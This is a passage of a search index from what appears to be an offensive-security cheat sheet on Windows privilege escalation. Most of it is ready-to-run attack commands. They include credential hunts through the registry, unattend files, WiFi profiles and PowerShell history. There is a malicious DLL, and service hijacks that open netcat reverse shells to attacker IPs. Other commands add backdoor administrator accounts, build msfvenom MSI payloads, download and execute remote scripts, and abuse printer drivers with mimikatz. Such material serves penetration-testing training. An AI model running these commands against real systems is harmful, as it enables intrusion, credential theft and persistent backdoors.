contents"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#search-for-a-file-with-a-certain-filename","text":"dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* where /R C:\\ user.txt where /R C:\\ *.ini","title":"Search for a file with a certain filename"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#search-the-registry-for-key-names-and-passwords","text":"REG QUERY HKLM /F \"password\" /t REG_SZ /S /K REG QUERY HKCU /F \"password\" /t REG_SZ /S /K reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" # Windows Autologin reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2>nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\" reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" # SNMP parameters reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" # Putty clear text proxy credentials reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" # VNC credentials reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s","title":"Search the registry for key names and passwords"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#read-a-value-of-a-certain-sub-key","text":"REG QUERY \"HKLM\\Software\\Microsoft\\FTH\" /V RuleList","title":"Read a value of a certain sub key"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#passwords-in-unattendxml","text":"Location of the unattend.xml files. C:\\unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.inf C:\\Windows\\system32\\sysprep\\sysprep.xml Display the content of these files with dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul . Example content <component name=\"Microsoft-Windows-Shell-Setup\" publicKeyToken=\"31bf3856ad364e35\" language=\"neutral\" versionScope=\"nonSxS\" processorArchitecture=\"amd64\"> <AutoLogon> <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password> <Enabled>true</Enabled> <Username>Administrateur</Username> </AutoLogon> <UserAccounts> <LocalAccounts> <LocalAccount wcm:action=\"add\"> <Password>*SENSITIVE*DATA*DELETED*</Password> <Group>administrators;users</Group> <Name>Administrateur</Name> </LocalAccount> </LocalAccounts> </UserAccounts> Unattend credentials are stored in base64 and can be decoded manually with base64. $ echo \"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=\" | base64 -d SecretSecurePassword1234* The Metasploit module post/windows/gather/enum_unattend looks for these files.","title":"Passwords in unattend.xml"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#iis-web-config","text":"Get-Childitem \u2013Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config C:\\inetpub\\wwwroot\\web.config","title":"IIS Web config"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#other-files","text":"%SYSTEMDRIVE%\\pagefile.sys %WINDIR%\\debug\\NetSetup.log %WINDIR%\\repair\\sam %WINDIR%\\repair\\system %WINDIR%\\repair\\software, %WINDIR%\\repair\\security %WINDIR%\\iis6.log %WINDIR%\\system32\\config\\AppEvent.Evt %WINDIR%\\system32\\config\\SecEvent.Evt %WINDIR%\\system32\\config\\default.sav %WINDIR%\\system32\\config\\security.sav %WINDIR%\\system32\\config\\software.sav %WINDIR%\\system32\\config\\system.sav %WINDIR%\\system32\\CCM\\logs\\*.log %USERPROFILE%\\ntuser.dat %USERPROFILE%\\LocalS~1\\Tempor~1\\Content.IE5\\index.dat %WINDIR%\\System32\\drivers\\etc\\hosts C:\\ProgramData\\Configs\\* C:\\Program Files\\Windows PowerShell\\* dir c:*vnc.ini /s /b dir c:*ultravnc.ini /s /b","title":"Other files"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#wifi-passwords","text":"Find AP SSID netsh wlan show profile Get Cleartext Pass netsh wlan show profile <SSID> key=clear Oneliner method to extract wifi passwords from all the access point. cls & echo. & for /f \"tokens=4 delims=: \" %a in ('netsh wlan show profiles ^| find \"Profile \"') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr \"SSID Cipher Content\" | find /v \"Number\" & echo.) & @echo on","title":"Wifi passwords"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#sticky-notes-passwords","text":"The sticky notes app stores it's content in a sqlite db located at C:\\Users\\<user>\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite","title":"Sticky Notes passwords"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#passwords-stored-in-services","text":"Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1 Import-Module path\\to\\SessionGopher.ps1; Invoke-SessionGopher -AllDomain -o Invoke-SessionGopher -AllDomain -u domain.com\\adm-arvanaghi -p s3cr3tP@ss","title":"Passwords stored in services"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#passwords-stored-in-key-manager","text":":warning: This software will display its output in a GUI rundll32 keymgr,KRShowKeyMgr","title":"Passwords stored in Key Manager"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#powershell-history","text":"Disable Powershell history: Set-PSReadlineOption -HistorySaveStyle SaveNothing . type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt type C:\\Users\\swissky\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt cat (Get-PSReadlineOption).HistorySavePath cat (Get-PSReadlineOption).HistorySavePath | sls passw","title":"Powershell History"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#powershell-transcript","text":"C:\\Users\\<USERNAME>\\Documents\\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt C:\\Transcripts\\<DATE>\\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt","title":"Powershell Transcript"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#password-in-alternate-data-stream","text":"PS > Get-Item -path flag.txt -Stream * PS > Get-Content -path flag.txt -Stream Flag","title":"Password in Alternate Data Stream"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-processes-enumeration-and-tasks","text":"What processes are running? powershell tasklist /v net start sc query Get-Service Get-Process Get-WmiObject -Query \"Select * from Win32_Process\" | where {$_.Name -notlike \"svchost*\"} | Select Name, Handle, @{Label=\"Owner\";Expression={$_.GetOwner().User}} | ft -AutoSize Which processes are running as \"system\" powershell tasklist /v /fi \"username eq system\" Do you have powershell magic? powershell REG QUERY \"HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine\" /v PowerShellVersion List installed programs powershell Get-ChildItem 'C:\\Program Files', 'C:\\Program Files (x86)' | ft Parent,Name,LastWriteTime Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name List services powershell net start wmic service list brief tasklist /SVC Enumerate scheduled tasks powershell schtasks /query /fo LIST 2>nul | findstr TaskName schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep \"SYSTEM\\|Task To Run\" | grep -B 1 SYSTEM Get-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | ft TaskName,TaskPath,State Startup tasks powershell wmic startup get caption,command reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\R reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce dir \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\" dir \"C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\Startup\"","title":"EoP - Processes Enumeration and Tasks"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-incorrect-permissions-in-services","text":"A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system. Often, services are pointing to writeable locations: - Orphaned installs, not installed anymore but still exist in startup - DLL Hijacking ```powershell # find missing DLL - Find-PathDLLHijack PowerUp.ps1 - Process Monitor : check for \"Name Not Found\" # compile a malicious dll - For x64 compile with: \"x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll\" - For x86 compile with: \"i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll\" # content of windows_dll.c #include <windows.h> BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { if (dwReason == DLL_PROCESS_ATTACH) { system(\"cmd.exe /k whoami > C:\\\\Windows\\\\Temp\\\\dll.txt\"); ExitProcess(0); } return TRUE; } ``` PATH directories with weak permissions ```powershell $ for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> c:\\windows\\temp\\permissions.txt $ for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\" $ sc query state=all | findstr \"SERVICE_NAME:\" >> Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i >> services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" >> path.txt ``` Alternatively you can use the Metasploit exploit : exploit/windows/local/service_permissions Note to check file permissions you can use cacls and icacls icacls (Windows Vista +) cacls (Windows XP) You are looking for BUILTIN\\Users:(F) (Full access), BUILTIN\\Users:(M) (Modify access) or BUILTIN\\Users:(W) (Write-only access) in the output.","title":"EoP - Incorrect permissions in services"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#example-with-windows-10-cve-2019-1322-usosvc","text":"Prerequisite: Service account PS C:\\Windows\\system32> sc.exe stop UsoSvc PS C:\\Windows\\system32> sc.exe config usosvc binPath=\"C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe 10.10.10.10 4444 -e cmd.exe\" PS C:\\Windows\\system32> sc.exe config UsoSvc binpath= \"C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe\" PS C:\\Windows\\system32> sc.exe config UsoSvc binpath= \"cmd /C C:\\Users\\nc.exe 10.10.10.10 4444 -e cmd.exe\" PS C:\\Windows\\system32> sc.exe qc usosvc [SC] QueryServiceConfig SUCCESS SERVICE_NAME: usosvc TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START (DELAYED) ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Update Orchestrator Service DEPENDENCIES : rpcss SERVICE_START_NAME : LocalSystem PS C:\\Windows\\system32> sc.exe start UsoSvc","title":"Example with Windows 10 - CVE-2019-1322 UsoSvc"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#example-with-windows-xp-sp1-upnphost","text":"# NOTE: spaces are mandatory for this exploit to work ! sc config upnphost binpath= \"C:\\Inetpub\\wwwroot\\nc.exe 10.11.0.73 4343 -e C:\\WINDOWS\\System32\\cmd.exe\" sc config upnphost obj= \".\\LocalSystem\" password= \"\" sc qc upnphost sc config upnphost depend= \"\" net start upnphost If it fails because of a missing dependency, try the following commands. sc config SSDPSRV start=auto net start SSDPSRV net stop upnphost net start upnphost sc config upnphost depend=\"\" Using accesschk from Sysinternals or accesschk-XP.exe - github.com/phackt $ accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula RW SSDPSRV SERVICE_ALL_ACCESS RW upnphost SERVICE_ALL_ACCESS $ accesschk.exe -ucqv upnphost upnphost RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users SERVICE_ALL_ACCESS RW BUILTIN\\Power Users SERVICE_ALL_ACCESS $ sc config <vuln-service> binpath=\"net user backdoor backdoor123 /add\" $ sc config <vuln-service> binpath= \"C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe\" $ sc stop <vuln-service> $ sc start <vuln-service> $ sc config <vuln-service> binpath=\"net localgroup Administrators backdoor /add\" $ sc stop <vuln-service> $ sc start <vuln-service>","title":"Example with Windows XP SP1 - upnphost"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-windows-subsystem-for-linux-wsl","text":"Technique borrowed from Warlockobama's tweet With root privileges Windows Subsystem for Linux (WSL) allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ .exe --default-user root. Now start your bind shell or reverse. wsl whoami ./ubuntun1604.exe config --default-user root wsl whoami wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE' Binary bash.exe can also be found in C:\\Windows\\WinSxS\\amd64_microsoft-windows-lxssbash_[...]\\bash.exe Alternatively you can explore the WSL filesystem in the folder C:\\Users\\%USERNAME%\\AppData\\Local\\Packages\\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\\LocalState\\rootfs\\","title":"EoP - Windows Subsystem for Linux (WSL)"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-unquoted-service-paths","text":"The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first. wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\" wmic service get name,displayname,startmode,pathname | findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\" gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\\Windows*\" -and $_.PathName -notlike '\"*'} | select PathName,DisplayName,Name Metasploit exploit : exploit/windows/local/trusted_service_path PowerUp exploit ```powershell # find the vulnerable application C:> powershell.exe -nop -exec bypass \"IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks\" ... [*] Checking for unquoted service paths... ServiceName : BBSvc Path : C:\\Program Files\\Microsoft\\Bing Bar\\7.1\\BBSvc.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path ...","title":"EoP - Unquoted Service Paths"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#automatic-exploit","text":"Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command \"....\\Users\\Public\\nc.exe 10.10.10.10 4444 -e cmd.exe\" ```","title":"automatic exploit"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#example","text":"For C:\\Program Files\\something\\legit.exe , Windows will try the following paths first: - C:\\Program.exe - C:\\Program Files.exe","title":"Example"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-path-interception","text":"Requirements: - PATH contains a writeable folder with low privileges. - The writeable folder is before the folder that contains the legitimate binary. EXAMPLE: # List contents of the PATH environment variable # EXAMPLE OUTPUT: C:\\Program Files\\nodejs\\;C:\\WINDOWS\\system32 $env:Path # See permissions of the target folder # EXAMPLE OUTPUT: BUILTIN\\Users: GR,GW icacls.exe \"C:\\Program Files\\nodejs\\\" # Place our evil-file in that folder. copy evil-file.exe \"C:\\Program Files\\nodejs\\cmd.exe\" Because (in this example) \"C:\\Program Files\\nodejs\\\" is before \"C:\\WINDOWS\\system32\\\" on the PATH variable, the next time the user runs \"cmd.exe\", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder.","title":"EoP - $PATH Interception"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-named-pipes","text":"Find named pipes: [System.IO.Directory]::GetFiles(\"\\\\.\\pipe\\\") Check named pipes DACL: pipesec.exe <named_pipe> Reverse engineering software Send data throught the named pipe : program.exe >\\\\.\\pipe\\StdOutPipe 2>\\\\.\\pipe\\StdErrPipe","title":"EoP - Named Pipes"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-kernel-exploitation","text":"List of exploits kernel : https://github.com/SecWiki/windows-kernel-exploits","title":"EoP - Kernel Exploitation"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#security-bulletinkb-descriptionoperating-system","text":"MS17-017 \u3000[KB4013081]\u3000\u3000[GDI Palette Objects Local Privilege Escalation]\u3000\u3000(windows 7/8) CVE-2017-8464 \u3000[LNK Remote Code Execution Vulnerability]\u3000\u3000(windows 10/8.1/7/2016/2010/2008) CVE-2017-0213 \u3000[Windows COM Elevation of Privilege Vulnerability]\u3000\u3000(windows 10/8.1/7/2016/2010/2008) CVE-2018-0833 [SMBv3 Null Pointer Dereference Denial of Service] (Windows 8.1/Server 2012 R2) CVE-2018-8120 [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1) MS17-010 \u3000[KB4013389]\u3000\u3000[Windows Kernel Mode Drivers]\u3000\u3000(windows 7/2008/2003/XP) MS16-135 \u3000[KB3199135]\u3000\u3000[Windows Kernel Mode Drivers]\u3000\u3000(2016) MS16-111 \u3000[KB3186973]\u3000\u3000[kernel api]\u3000\u3000(Windows 10 10586 (32/64)/8.1) MS16-098 \u3000[KB3178466]\u3000\u3000[Kernel Driver]\u3000\u3000(Win 8.1) MS16-075 \u3000[KB3164038]\u3000\u3000[Hot Potato]\u3000\u3000(2003/2008/7/8/2012) MS16-034 \u3000[KB3143145]\u3000\u3000[Kernel Driver]\u3000\u3000(2008/7/8/10/2012) MS16-032 \u3000[KB3143141]\u3000\u3000[Secondary Logon Handle]\u3000\u3000(2008/7/8/10/2012) MS16-016 \u3000[KB3136041]\u3000\u3000[WebDAV]\u3000\u3000(2008/Vista/7) MS16-014 \u3000[K3134228]\u3000\u3000[remote code execution]\u3000\u3000(2008/Vista/7) ... MS03-026 \u3000[KB823980]\u3000\u3000 [Buffer Overrun In RPC Interface]\u3000\u3000(/NT/2000/XP/2003) To cross compile a program from Kali, use the following command. Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c","title":"#Security Bulletin&nbsp;&nbsp;&nbsp;#KB &nbsp;&nbsp;&nbsp;&nbsp;#Description&nbsp;&nbsp;&nbsp;&nbsp;#Operating System"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-alwaysinstallelevated","text":"Check if these registry values are set to \"1\". $ reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated $ reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated $ Get-ItemProperty HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer $ Get-ItemProperty HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer Then create an MSI package and install it. $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi $ msiexec /quiet /qn /i C:\\evil.msi Technique also available in : * Metasploit : exploit/windows/local/always_install_elevated * PowerUp.ps1 : Get-RegistryAlwaysInstallElevated , Write-UserAddMSI","title":"EoP - AlwaysInstallElevated"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-insecure-gui-apps","text":"Application running as SYSTEM allowing an user to spawn a CMD, or browse directories. Example: \"Windows Help and Support\" (Windows + F1), search for \"command prompt\", click on \"Click to open Command Prompt\"","title":"EoP - Insecure GUI apps"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-evaluating-vulnerable-drivers","text":"Look for vuln drivers loaded, we often don't spend enough time looking at this: # https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery PS C:\\Users\\Swissky> driverquery.exe /fo table Module Name Display Name Driver Type Link Date ============ ====================== ============= ====================== 1394ohci 1394 OHCI Compliant Ho Kernel 12/10/2006 4:44:38 PM 3ware 3ware Kernel 5/18/2015 6:28:03 PM ACPI Microsoft ACPI Driver Kernel 12/9/1975 6:17:08 AM AcpiDev ACPI Devices driver Kernel 12/7/1993 6:22:19 AM acpiex Microsoft ACPIEx Drive Kernel 3/1/2087 8:53:50 AM acpipagr ACPI Processor Aggrega Kernel 1/24/2081 8:36:36 AM AcpiPmi ACPI Power Meter Drive Kernel 11/19/2006 9:20:15 PM acpitime ACPI Wake Alarm Driver Kernel 2/9/1974 7:10:30 AM ADP80XX ADP80XX Kernel 4/9/2015 4:49:48 PM <SNIP> PS C:\\Users\\Swissky> DriverQuery.exe --no-msft [+] Enumerating driver services... [+] Checking file signatures... Citrix USB Filter Driver Service Name: ctxusbm Path: C:\\Windows\\system32\\DRIVERS\\ctxusbm.sys Version: 14.11.0.138 Creation Time (UTC): 17/05/2018 01:20:50 Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US Signer: CN=\"Citrix Systems, Inc.\", OU=XenApp(ClientSHA256), O=\"Citrix Systems, Inc.\", L=Fort Lauderdale, S=Florida, C=US <SNIP>","title":"EoP - Evaluating Vulnerable Drivers"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-printers","text":"","title":"EoP - Printers"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#universal-printer","text":"Create a Printer $printerName = 'Universal Priv Printer' $system32 = $env:systemroot + '\\system32' $drivers = $system32 + '\\spool\\drivers' $RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers\\' + $printerName Copy-Item -Force -Path ($system32 + '\\mscms.dll') -Destination ($system32 + '\\mimispool.dll') Copy-Item -Force -Path '.\\mimikatz_trunk\\x64\\mimispool.dll' -Destination ($drivers + '\\x64\\3\\mimispool.dll') Copy-Item -Force -Path '.\\mimikatz_trunk\\win32\\mimispool.dll' -Destination ($drivers + '\\W32X86\\3\\mimispool.dll') Add-PrinterDriver -Name 'Generic / Text Only' Add-Printer -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared New-Item -Path ($RegStartPrinter + '\\CopyFiles') | Out-Null New-Item -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi') -Name 'Directory' -PropertyType 'String' -Value 'x64\\3' | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi') -Name 'Files' -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi') -Name 'Module' -PropertyType 'String' -Value 'mscms.dll' | Out-Null New-Item -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Directory' -PropertyType 'String' -Value 'W32X86\\3' | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Files' -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Module' -PropertyType 'String' -Value 'mscms.dll' | Out-Null New-Item -Path ($RegStartPrinter + '\\CopyFiles\\Mango') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango') -Name 'Directory' -PropertyType 'String' -Value $null | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango') -Name 'Files' -PropertyType 'MultiString' -Value $null | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango') -Name 'Module' -PropertyType 'String' -Value 'mimispool.dll' | Out-Null Execute the driver $serverName = 'dc.purple.lab' $printerName = 'Universal Priv Printer' $fullprinterName = '\\\\' + $serverName + '\\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'}) Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue Add-Printer -ConnectionName $fullprinterName","title":"Universal Printer"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#printernightmare","text":"git clone https://github.com/Flangvik/DeployPrinterNightmare PS C:\\adversary> FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell [<3] @Flangvik - TrustedSec [+] Copying C:\\Windows\\system32\\mscms.dll to C:\\Windows\\system32\\6cfbaf26f4c64131896df8a522546e9c.dll [+] Copying 64mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\x64\\3\\6cfbaf26f4c64131896df8a522546e9c.dll [+] Copying 32mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\W32X86\\3\\6cfbaf26f4c64131896df8a522546e9c.dll [+] Adding printer driver => Generic / Text Only! [+] Adding printer => EasySystemShell! [+] Setting 64-bit Registry key [+] Setting 32-bit Registry key [+] Setting '*' Registry key PS C:\\target> $serverName = 'printer-installed-host' PS C:\\target> $printerName = 'EasySystemShell' PS C:\\target> $fullprinterName = '\\\\' + $serverName + '\\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'}) PS C:\\target> Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue PS C:\\target> Add-Printer -ConnectionName $fullprinterName","title":"PrinterNightmare"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#bring-your-own-vulnerability","text":"Concealed Position : https://github.com/jacob-baines/concealed_position ACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE cp_server.exe -e ACIDDAMAGE # Get-Printer # Set the \"Advanced Sharing Settings\" -> \"Turn off password protected sharing\" cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE cp_client.exe -l -e ACIDDAMAGE","title":"Bring Your Own Vulnerability"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-runas","text":"Use the cmdkey to list the stored credentials on the machine. cmdkey /list Currently stored credentials: Target: Domain:interactive=WORKGROUP\\Administrator Type: Domain Password User: WORKGROUP\\Administrator Then you can use runas with the /savecred options in order to use the saved credentials. The following example is calling a remote binary via an SMB share. runas /savecred /user:WORKGROUP\\Administrator \"\\\\10.XXX.XXX.XXX\\SHARE\\evil.exe\" runas /savecred /user:Administrator \"cmd.exe /k whoami\" Using runas with a provided set of credential. C:\\Windows\\System32\\runas.exe /env /noprofile /user:<username> <password> \"c:\\users\\Public\\nc.exe -nc <attacker-ip> 4444 -e cmd.exe\" $secpasswd = ConvertTo-SecureString \"<password>\" -AsPlainText -Force $mycreds = New-Object System.Management.Automation.PSCredential (\"<user>\", $secpasswd) $computer = \"<hostname>\" [System.Diagnostics.Process]::Start(\"C:\\users\\public\\nc.exe\",\"<attacker_ip> 4444 -e cmd.exe\", $mycreds.Username, $mycreds.Password, $computer)","title":"EoP - Runas"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-abusing-shadow-copies","text":"If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation. # List shadow copies using vssadmin (Needs Admnistrator Access) vssadmin list shadows # List shadow copies using diskshadow diskshadow list shadows all # Make a symlink to the shadow copy and access it mklink /d c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\","title":"EoP - Abusing Shadow Copies"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-from-local-administrator-to-nt-system","text":"PsExec.exe -i -s cmd.exe","title":"EoP - From local administrator to NT SYSTEM"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-living-off-the-land-binaries-and-scripts","text":"Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/ The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques. A LOLBin/Lib/Script must: Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft. Have extra \"unexpected\" functionality. It is not interesting to document intended use cases. Exceptions are application whitelisting bypasses Have functionality that would be useful to an APT or red team wmic.exe process call create calc regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll Microsoft.Workflow.Compiler.exe tests.xml results.xml","title":"EoP - Living Off The Land Binaries and Scripts"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-impersonation-privileges","text":"Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files. Privilege Impact Tool Execution path Remarks SeAssignPrimaryToken Admin 3rd party tool \"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe\" Thank you Aur\u00e9lien Chalot for 